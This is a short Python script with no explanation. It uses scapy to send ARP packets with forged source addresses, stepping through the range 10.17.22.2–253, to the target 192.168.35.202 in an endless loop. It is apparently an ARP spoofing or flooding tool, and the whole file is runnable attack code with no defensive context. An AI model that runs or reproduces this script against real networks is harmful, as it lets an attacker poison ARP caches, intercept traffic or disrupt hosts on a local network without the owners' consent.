#!/usr/bin/python
import sys

from scapy.all import *

while(1):
    for b in xrange(2, 254):
#    	for c in xrange(2,30):
        	send(ARP(psrc="10.17.22."+str(b), pdst="192.168.35.202"))
